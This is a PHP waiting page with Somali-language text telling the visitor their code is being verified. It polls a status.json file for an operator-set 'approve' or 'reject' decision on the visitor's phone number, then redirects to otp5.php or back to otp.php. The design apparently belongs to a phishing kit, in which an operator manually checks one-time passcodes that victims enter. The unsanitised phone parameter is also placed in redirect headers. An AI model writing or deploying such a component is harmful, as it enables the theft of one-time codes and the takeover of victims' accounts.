<?php
$phone = $_GET['phone'] ?? '';

if(!$phone){
    echo "Invalid access";
    exit();
}

// File where statuses are stored
$file = __DIR__ . "/status.json";
$statuses = file_exists($file) ? json_decode(file_get_contents($file), true) : [];

// Check status
$status = $statuses[$phone]['otp'] ?? '';

if($status === 'approve'){
    header("Location: otp5.php?phone=$phone");
    exit();
}

if($status === 'reject'){
    header("Location: otp.php?phone=$phone&error=1");
    exit();
}
?>

<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="refresh" content="2">
    <title>Waiting</title>
    <link rel="stylesheet" href="style.css">
</head>

<body>
<div class="waiting-container">
    <h2>Fadlan sug,koodhkaaga waa la xaqiijinayaa...</h2>
    <div class="loader">
        <span></span>
        <span></span>
        <span></span>
    </div>
</div>
</body>
</html>